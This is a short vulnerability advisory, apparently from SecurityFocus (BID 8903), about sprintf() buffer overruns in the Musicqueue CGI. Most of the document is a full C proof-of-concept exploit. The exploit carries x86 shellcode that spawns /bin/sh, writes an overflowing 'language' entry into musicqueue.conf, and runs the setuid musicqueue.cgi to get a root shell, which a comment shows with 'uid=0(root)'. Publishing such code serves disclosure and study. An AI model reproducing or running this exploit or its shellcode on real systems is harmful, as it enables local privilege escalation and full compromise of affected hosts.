source: http://www.securityfocus.com/bid/8903/info

Multiple buffer overrun vulnerabilities have been discovered in Musicqueue. Both issues stem from the lack of bounds checking when passing user-supplied input to the sprintf() libc function. As a result, it may be possible for an attacker to exploit arbitrary code with the privileges the affected application, possibly installed suid or sgid.

/*
**
** 0x82-musicqueue_over - musicqueue.cgi local root `Proof of Concept' exploit
**
** This is general overflow exploit.
**
** --
** bash-2.04$ ./0x82-musicqueue_over /tmp/musicqueue-1.1.1/musicqueue.cgi
**
** 0x82-musicqueue_over - musicqueue.cgi v-0.9~1.1.1 `Proof of Concept'
**
** sh-2.04# id
** uid=0(root) gid=0(root) groups=500(x82)
** sh-2.04# 
** --
** exploit by "you dong-hun"(Xpl017Elz), <szoahc@hotmail.com>.
** My World: http://x82.i21c.net & http://x82.inetcop.org
**
*/

#include <stdio.h>

int main(int argc,char *argv[])
{
	FILE *fp;
	int r_rn=0;
	char *ent_r[3],atck_d[0x82];
	char shellcode[]=
		"\220@\220@\220@\220@\220@\220@\220@\220@\220@"
		"\220@\220@\220@\220@\220@\220@\220@\220@\220@"
		"1\300\260F1\3331\311\315\2001\300\260G1\3331"
		"\311\315\200\353\037^\211v\b1\300\210F\007"
		"\211F\f\260\013\211\363\215N\b\215V\f\315\2001"
		"\333\211\330@\315\200\350\334\377\377\377"
		"/bin/sh";

	unsigned long sh_addr=(0xbfffffff-(strlen(shellcode)));
	memset((char *)atck_d,0,sizeof(atck_d));

	fprintf(stdout,"\n 0x82-musicqueue_over - musicqueue.cgi v-0.9~1.1.1 POC exploit.\n\n");

	if(argc<2)
	{
		fprintf(stdout," Usage: %s [musicqueue.cgi path]\n\n",argv[0]);
		exit(-1);
	}
	else sh_addr-=(strlen(argv[1]));

	atck_d[r_rn++]=0x82;
	for(;r_rn<44;r_rn+=4)
	{
		*(long *)&atck_d[r_rn]=sh_addr;
	}

	if((fp=fopen("musicqueue.conf","w"))==NULL)
	{
	fprintf(stderr," [-] musicqueue.conf fopen() error.\n\n");
	return(-1);
	}
	fprintf(fp,"language = %s\n",atck_d);
	fclose(fp);

	ent_r[0]="REQUEST_METHOD=GET";
	ent_r[1]=(shellcode);
	ent_r[2]=(NULL);
	execle(argv[1],"musicqueue.cgi",NULL,ent_r);
}
